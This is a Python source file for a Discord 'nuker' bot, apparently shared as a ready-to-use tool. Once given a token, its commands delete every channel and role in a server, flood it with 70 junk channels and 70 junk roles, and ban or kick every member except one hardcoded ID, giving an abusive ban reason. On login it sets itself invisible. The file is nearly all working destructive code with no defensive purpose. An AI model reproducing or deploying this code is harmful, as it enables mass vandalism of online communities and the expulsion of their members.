# idk

import discord
import os
import aiohttp
from discord.ext import commands

prefix = "."
token = ""
ignore = "971351289306947594"
channelname = "rip-channels"
rolename = "rip roles"
headers = {'Authorization': f'Bot {token}'}

client = commands.Bot(command_prefix=prefix, case_insensitive=True, intents=discord.Intents.all())

@client.event
async def on_ready():
  os.system("clear")
  print(f'- connected with {client.user}\n- made by spence')
  await client.change_presence(status=discord.Status.invisible)

@client.command(aliases=["clearch", "deletech"])
async def delchannels(ctx):
  await ctx.message.delete()
  async with aiohttp.ClientSession(headers=headers, connector=None) as session:
    for channels in ctx.guild.channels:
      try:
        async with session.delete(f"https://discord.com/api/v10/channels/{channels.id}") as req:
          print(req.status)
      except:
        pass


@client.command(aliases=["spamch", "channelspam"])
async def spamchannel(ctx):
  await ctx.message.delete()
  for i in range(70):
    async with aiohttp.ClientSession(headers=headers, connector=None) as session:
      try:
        async with session.post(f"https://discord.com/api/v10/guilds/{ctx.guild.id}/channels",json={"name":channelname}) as req:
          print(req.status)
      except:
        pass

@client.command(aliases=["spamr", "rolespam"])
async def spamrole(ctx):
  await ctx.message.delete()
  for i in range(70):
    async with aiohttp.ClientSession(headers=headers, connector=None) as session:
      try:
        async with session.post(f"https://discord.com/api/v10/guilds/{ctx.guild.id}/roles",json={"name":rolename}) as req:
          print(req.status)
      except:
        pass

@client.command(aliases=["clearr", "deleter"])
async def delroles(ctx):
  await ctx.message.delete()
  async with aiohttp.ClientSession(headers=headers, connector=None) as session:
    for roles in ctx.guild.roles:
      try:
        async with session.delete(f"https://discord.com/api/v10/roles/{roles.id}") as req:
          print(req.status)
      except:
        pass

@client.command(aliases=["banall"])
async def massban(ctx):
  await ctx.message.delete()
  async with aiohttp.ClientSession(headers=headers, connector=None) as session:
    for member in ctx.guild.members:
      if member.id == int(ignore):
        pass
      else:
        try:
          async with session.put(f"https://discord.com/api/v10/guilds/{ctx.guild.id}/bans/{member.id}", json={"reason": "- fucked by spence"}) as req:
                                print(req.status)
        except:
          pass

@client.command(aliases=["kickall"])
async def masskick(ctx):
  await ctx.message.delete()
  async with aiohttp.ClientSession(headers=headers, connector=None) as session:
    for member in ctx.guild.members:
      if member.id == int(ignore):
        pass
      else:
        try:
          async with session.delete(f"https://discord.com/api/v10/guilds/{ctx.guild.id}/members/{member.id}", json={"reason": "- fucked by spence"}) as req:
                 print(req.status)
        except:
          pass

client.run(token)
